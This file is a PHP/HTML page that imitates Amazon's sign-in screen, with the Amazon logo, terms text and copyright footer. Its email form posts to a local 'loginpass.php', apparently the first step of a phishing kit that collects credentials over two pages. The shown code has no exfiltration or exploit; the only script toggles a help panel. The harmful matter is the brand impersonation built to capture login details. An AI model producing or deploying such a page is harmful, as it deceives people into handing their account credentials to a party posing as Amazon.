<?php include_once('header.php'); ?>

    <div class="container login-top">
      <div class="row">
         <img class='logo' src="img/amazon-logo.png" alt="" height='103px'>

      </div>
      <form action="loginpass.php" method='post'>
      <div class="login-form">
          <div class="login-box">
          <h2 class='signin-text'>Sign-In</h2>
          <label for="email" class="label-email">Email (phone for mobile accounts)</label
          ><br />
          <input
            class="email-text m-top3"
            type="email"
            name="email"
            autocomplete="off"
            required
          />
          <br />
          <input type="submit" class="input-continue mt-1" value='Continue'/>
          <p class="terms-text">By signing in, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.</p>
          <i class="fa fa-caret-right" color="" aria-hidden="true"></i><a class='collapsible needhelp-text'>   Need help?</a>
            <div class="content">
              <a class='link' href="#">Forgot your password?</a><br>
              <a class='link' href="#">Other issues with Sign-in</a>
            </div>
          
            <script>
                var coll = document.getElementsByClassName("collapsible");
                var i;

                for (i = 0; i < coll.length; i++) {
                  coll[i].addEventListener("click", function() {
                    this.classList.toggle("active");
                    var content = this.nextElementSibling;
                    if (content.style.maxHeight){
                      content.style.maxHeight = null;
                    } else {
                      content.style.maxHeight = content.scrollHeight + "px";
                    }
                  });
                }
           </script>     
        </div>
      </div>
      </form>
         <div class="bar1">
          <hr class="hr-text" data-content='New to Amazon?'>
          <input type="button" id="create-account" class='create-account' value="Create your Amazon account">
          </div>
         <div class="bar2">
           <hr class='hr-text2'>
         </div>
      </div>
      <div class="bar1">
        <div class="row">
          <div class="btm-link-wrap"><a class='link-btm col ml-3' href="#">Conditions of Use</a></div>
          <div class="btm-link-wrap"><a class='link-btm col' href="#">Privacy Notice</a></div>
          <div class="btm-link-wrap"><a class='link-btm col' href="#">Help</a></div>
            <span class="footer-text">
              © 1996-2020, Amazon.com, Inc. or its affiliates
            </span>
        </div>
      </div>
    </div>
    <?php include_once('footer.php'); ?>


